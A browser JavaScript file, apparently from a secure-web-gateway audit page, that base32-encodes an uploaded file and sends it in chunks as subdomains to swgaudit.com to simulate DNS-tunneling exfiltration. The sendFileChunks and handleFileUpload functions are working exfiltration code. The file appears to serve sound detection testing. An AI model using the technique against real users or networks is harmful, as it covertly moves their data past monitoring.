// Custom base32 encoding function with lowercase characters
function base32Encode(data) {
  const alphabet = "abcdefghijklmnopqrstuvwxyz234567";
  const bytes = new Uint8Array(data);
  let result = "";
  let buffer = 0;
  let bitsLeft = 0;

  for (const byte of bytes) {
    buffer = (buffer << 8) | byte;
    bitsLeft += 8;

    while (bitsLeft >= 5) {
      result += alphabet[(buffer >> (bitsLeft - 5)) & 31];
      bitsLeft -= 5;
    }
  }

  if (bitsLeft > 0) {
    result += alphabet[(buffer << (5 - bitsLeft)) & 31];
  }

  return result;
}

// Function to chunk encoded data
function chunkString(str, size) {
  const chunks = [];
  for (let i = 0; i < str.length; i += size) {
    chunks.push(str.slice(i, i + size));
  }
  return chunks;
}

// Function to send XHR requests with encoded file chunks as subdomains
async function sendFileChunks(encodedData, filename) {
  const chunks = chunkString(encodedData, 63); // 63 characters per chunk for DNS subdomain compatibility

  for (let i = 0; i < chunks.length; i++) {
    const xhr = new XMLHttpRequest();
    const url = `https://${chunks[i]}.swgaudit.com/exfiltrate?chunk=${i}&total=${chunks.length}&filename=${encodeURIComponent(filename)}`;

    xhr.open("GET", url, true);
    xhr.send();

    // Small delay between requests to simulate realistic exfiltration
    await new Promise((resolve) => setTimeout(resolve, 100));
  }

  console.log(`File exfiltration simulation completed for ${filename}`);
  alert(`File "${filename}" has been processed for DNS tunneling simulation.`);
}

// Handle file upload
async function handleFileUpload(file) {
  const allowedTypes = [
    ".pdf",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".txt",
    ".doc",
    ".docx",
  ];
  const fileExtension = "." + file.name.split(".").pop().toLowerCase();

  if (!allowedTypes.includes(fileExtension)) {
    alert("Please select a supported file type: .pdf, .img, .txt, .docx");
    return;
  }

  try {
    // Show loading state
    const uploadArea = document.getElementById("fileUploadArea");
    const originalContent = uploadArea.innerHTML;
    uploadArea.innerHTML = `
      <div class="upload-content">
        <div style="color: #fff; font-size: 18px;">Processing file...</div>
        <div style="color: #bebebe; font-size: 16px;">Encoding and preparing for DNS tunneling</div>
      </div>
    `;

    // Read file as ArrayBuffer
    const arrayBuffer = await file.arrayBuffer();

    // Encode file using custom base32
    const encodedData = base32Encode(arrayBuffer);

    // Send encoded data via XHR in chunks as subdomains
    await sendFileChunks(encodedData, file.name);

    // Reset upload area
    setTimeout(() => {
      uploadArea.innerHTML = originalContent;
      setupFileUploadEvents();
    }, 2000);
  } catch (error) {
    console.error("Error during file upload simulation:", error);
    alert("Error occurred during file processing. Please try again.");

    // Reset upload area
    const uploadArea = document.getElementById("fileUploadArea");
    const originalContent = uploadArea.innerHTML;
    uploadArea.innerHTML = originalContent;
    setupFileUploadEvents();
  }
}

// Setup file upload events
function setupFileUploadEvents() {
  const fileUploadArea = document.getElementById("fileUploadArea");
  const fileInput = document.getElementById("fileInput");

  // Click to upload
  fileUploadArea.addEventListener("click", () => {
    fileInput.click();
  });

  // File input change
  fileInput.addEventListener("change", (e) => {
    const file = e.target.files[0];
    if (file) {
      handleFileUpload(file);
    }
  });

  // Drag and drop events
  fileUploadArea.addEventListener("dragover", (e) => {
    e.preventDefault();
    fileUploadArea.classList.add("drag-over");
  });

  fileUploadArea.addEventListener("dragleave", (e) => {
    e.preventDefault();
    fileUploadArea.classList.remove("drag-over");
  });

  fileUploadArea.addEventListener("drop", (e) => {
    e.preventDefault();
    fileUploadArea.classList.remove("drag-over");

    const files = e.dataTransfer.files;
    if (files.length > 0) {
      handleFileUpload(files[0]);
    }
  });
}

// Initialize when DOM is loaded
document.addEventListener("DOMContentLoaded", () => {
  setupFileUploadEvents();

  // Add smooth scrolling for any internal links
  document.querySelectorAll('a[href^="#"]').forEach((anchor) => {
    anchor.addEventListener("click", function (e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute("href"));
      if (target) {
        target.scrollIntoView({
          behavior: "smooth",
          block: "start",
        });
      }
    });
  });

  // Add hover effects for navigation items
  document.querySelectorAll(".nav-item").forEach((item) => {
    item.addEventListener("mouseenter", function () {
      if (!this.classList.contains("active")) {
        this.style.color = "#88392B";
      }
    });

    item.addEventListener("mouseleave", function () {
      if (!this.classList.contains("active")) {
        this.style.color = "#000";
      }
    });
  });
});
